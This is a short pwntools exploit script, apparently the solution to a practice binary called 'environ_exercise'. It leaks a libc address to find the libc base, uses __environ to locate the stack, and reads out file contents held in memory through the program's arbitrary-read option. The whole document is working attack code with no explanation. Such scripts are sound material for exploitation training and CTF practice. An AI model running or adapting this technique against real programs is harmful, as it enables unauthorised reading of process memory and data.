from pwn import *

def slog(name, addr):
        return success(": ".join([name, hex(addr)]))

p = process("./environ_exercise")
e = ELF("/lib/x86_64-linux-gnu/libc.so.6")


p.recvuntil(": ")

stdout = int(p.recvuntil("\n"), 16)
libc_base = stdout - e.symbols['_IO_2_1_stdout_']
libc_environ = libc_base + e.symbols['__environ']

slog("libc base", libc_base)
slog("libc environ", libc_environ)


p.sendlineafter(">", "1")
p.sendlineafter(":", str(libc_environ))

p.recv(1)
stack_environ = u64(p.recv(6).ljust(8, b"\x00")) 
file_content = stack_environ - 0x1538

slog("file content", file_content)


p.sendlineafter(">", "1")
p.sendlineafter(":", str(libc_environ))

p.sendlineafter(">", "1")
p.sendlineafter(":", str(file_content))

p.interactive()

